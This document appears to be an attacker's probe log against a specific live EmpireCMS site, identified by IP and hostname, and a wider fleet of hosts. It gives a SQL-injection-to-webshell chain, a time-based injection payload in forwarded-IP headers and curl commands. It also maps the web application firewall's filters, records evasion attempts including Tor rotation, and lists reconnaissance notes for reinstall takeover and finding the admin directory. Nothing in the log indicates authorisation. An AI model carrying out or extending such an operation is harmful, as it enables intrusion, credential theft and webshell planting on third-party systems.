# WAF content-rule mapping — verified probe log (EmpireCMS fleet, 2026-09-25)

Target: EmpireCMS 8.0 behind an app-layer "网站防火墙" (not Cloudflare). Lockface `45.200.18.15`,
Host `news.cgmask.com`, driven with `curl -sk --resolve HOST:443:IP -H 'Host: HOST'`.

## Why this was done
A public audit documented an EmpireCMS 8.0 front-end SQLi chain:

```
egetip() reads HTTP_CLIENT_IP / HTTP_X_FORWARDED_FOR with no filtering
  -> INSERT/UPDATE injection on register / login / gbook / feedback / shop (no auth)
  -> read phome_enewsuser username:password(md5)
  -> crack -> log in to backend
  -> 首页方案 template eval -> write webshell
```

Everything passed except step 1. Mapping the WAF content ruleset is what established that step 1 is
structurally unreachable here — versus "we didn't encode it right".

## Result: the WAF guards two headers and three characters

| Axis | Blocked | Passed |
|---|---|---|
| characters | `'` `"` `\` | `(` `)` `;` `--` `#` `/*` `*/` `<` `>` `=` `,` `%` `0x` space `+` backtick `\n` `\t` `\|` `&` `$` `@` `!` |
| SQL keywords | — (none) | `and 1=1`, `union select 1`, `sleep(1)`, `or 1=1`, `/**/and/**/1=1`, `0x31` |
| locations | header `X-Forwarded-For` / `Client-IP` only | GET query, POST body, Cookie, Referer, User-Agent, URL path (all passed `'`) |

Block signature: **HTTP 200 with `Content-Length: 0`** (not 403, not 444). A normal response was
~2440–2446 B (login/register page) or ~3371 B (EmpireCMS 404). `%00` returned 400, which proved the
interception sits in the gateway, before PHP.

## Header-source enumeration (time-based, one header per request)

Payload `1.2.3.4' and sleep(6)-- -`, compared against a clean `1.2.3.4` baseline.

| Header | clean | payload | verdict |
|---|---|---|---|
| `X-Forwarded-For` | 2.6s | 2.5s (0 B) | WAF-blocked |
| `Client-IP` | 2.5s | 2.7s (0 B) | WAF-blocked |
| `X-Client-IP`, `X-Real-IP`, `True-Client-IP`, `X-Originating-IP`, `X-Remote-Addr`, `Forwarded`, `X-Forwarded`, `X-Forwarded-Host`, `Remote-Addr`, `X-IP`, `X-ProxyUser-Ip`, `X-Cluster-Client-IP`, `X-Forwarded-For-Original`, `CF-Connecting-IP`, `X-Original-Forwarded-For`, `X-Envoy-External-Address`, `X-True-IP`, `Ali-CDN-Real-IP`, `X-Real-Forwarded-For`, `X-Forwarded-By`, `X-Forwarder-For`, `X-Host`, `X-Originating` (23 total) | ~2.0s | ~2.0s, 2440 B | **passed WAF but never reached `egetip()`** — no injection |

Conclusion: `egetip()` = `HTTP_CLIENT_IP` → `HTTP_X_FORWARDED_FOR` → `REMOTE_ADDR`, i.e. exactly the
two headers the WAF protects. No reachable input.

## The gap test (and why it closed)

| Setup | WAF | app (`egetip()`) | outcome |
|---|---|---|---|
| `Client-IP: 1.2.3.4` + `X-Forwarded-For: <payload>` | sees valid IP → skips XFF | uses `Client-IP` | no injection |
| `Client-IP: unknown` + `X-Forwarded-For: <payload>` | `unknown` isn't a valid IP → inspects XFF → blocks | skips to XFF (target!) | blocked |
| `Client-IP: <payload>` + clean `X-Forwarded-For` | Client-IP invalid → inspects XFF (clean) → passes | uses `Client-IP` | payload reaches SQL… but WAF blocked the payload variant of Client-IP |

There is no value that is simultaneously "equals `unknown` case-insensitively" (app skips) and
"parses as a valid IP" (WAF skips). The gap is closed — recorded as **blocked**, not as a pending task.

## Bypass attempts that failed (chronological, do not repeat)

- `%27` / `%2527` double-encoding — WAF doesn't decode headers, **and neither does PHP** `getenv()`; 2440 B normal response, no delay
- Underscore header names `X-Forwarded_FOR`, `Client_IP` — slip the WAF regex (2440 B, passed) but nginx drops underscore headers by default → `sleep` never fires
- Header-name case variants (`x-forwarded-for`, `X-FORWARDED-FOR`, `Client-ip`, `CLIENT-IP`) — WAF matching is case-insensitive
- Duplicate headers (2nd carrying the quote), folded/continuation lines, empty/leading headers, 4000-B padding then quote — all blocked
- HTTP/2, `--http2-prior-knowledge`, HTTP/1.0, `Transfer-Encoding: chunked` — all blocked identically
- Tor exit rotation (`--socks5-hostname 127.0.0.1:9050`) — blocked the same as direct ⇒ rule is **content-based, not IP-reputation-based**
- Path matrix (`/`, `/index.php`, `/e/member/register/`, `/e/member/doaction.php`, `/e/enews/index.php`, `/e/member/mspace/gbook.php`, …) — blocked everywhere ⇒ global, not per-path
- Backslash escaping (`1.2.3.4\`) — `\` is in the blocked character set

## Adjacent findings from the same sweep (reusable)

- **WAF path rule exists for the backend dir**: `/e/admin/` returned **444** across all 21 brand
  Hosts while every path-normalisation variant returned 404 — so the 444 is a WAF path rule, but the
  dir is genuinely renamed (all variants 404). Distinguish 444 (WAF) from 404 (absent) before
  concluding "renamed".
- **Side ports have different rulesets — check them**: the fleet exposed `888` (WAF, `/`→403,
  PHP paths→404, doesn't serve the CMS), `8783` (raw nginx, only `/close`→302), `51821` (wg-easy),
  `47777` (sshd). None bypassed the WAF for the CMS — but the 888 ruleset being *different* is why it
  was worth probing.
- **Install-lock file is not removable over HTTP**: `/e/install/index.php` reports the lock path
  (`/c/einstall/install.off`), the file exists (200/0 B), and DELETE/PUT return 405. Re-install-to-take-over
  is therefore closed unless you find a file-delete primitive elsewhere.
- **robots.txt leaks the real directory layout** even when the admin dir is renamed:
  `/c/ /e/class/ /e/config/ /e/data/ /e/enews/ /e/update/ /ecachefiles/ /esavedatas/` (the last two
  are stock EmpireCMS, not a custom fork — don't chase them as a bespoke-product fingerprint).
